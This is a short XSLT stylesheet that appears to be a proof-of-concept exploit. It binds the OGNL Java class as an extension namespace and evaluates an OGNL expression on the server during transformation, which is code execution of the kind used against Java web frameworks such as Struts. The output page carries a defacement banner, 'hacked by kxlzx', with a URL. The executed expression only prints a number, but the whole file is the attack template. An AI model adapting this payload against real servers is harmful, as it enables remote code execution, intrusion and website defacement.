<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                version="1.0" xmlns:ognl="ognl.Ognl">
    <xsl:template match="/">
        <html>
            <body>
                <h2>hacked by kxlzx</h2>
                <h2>http://www.inbreak.net</h2>
                <exp>
                    <xsl:value-of select="ognl:getValue('@System@out.println(1)', '')"></xsl:value-of>
                </exp>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>